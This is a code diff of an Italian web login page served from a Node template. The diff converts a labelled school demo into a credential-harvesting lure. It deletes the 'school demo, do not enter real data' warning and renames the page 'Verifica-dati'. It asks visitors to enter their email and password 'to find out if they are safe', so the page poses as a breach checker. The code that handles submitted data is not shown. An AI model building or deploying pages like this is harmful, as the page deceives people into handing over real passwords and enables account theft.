@@ -16,7 +16,7 @@ res.send(`
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Demo Login</title>
+<title>Verifica-dati</title>
 
 <style>
 
@@ -92,11 +92,11 @@ button:hover{
 
 <div class="card">
 
-<h1>Registrati</h1>
+<h1>Inserisci dati</h1>
 
 <div class="info">
-DEMO SCOLASTICA<br>
-Non inserire dati reali
+<br>
+Inserisci i tuoi dati per scoprire se sono al sicuro
 </div>
 
 <form id="form">
@@ -104,14 +104,14 @@ Non inserire dati reali
 <input
 type="text"
 id="emailDemo"
-placeholder="Email demo..."
+placeholder="Email..."
 required
 >
 
 <input
 type="text"
 id="codiceDemo"
-placeholder="Codice demo..."
+placeholder="Password..."
 required
 >
 
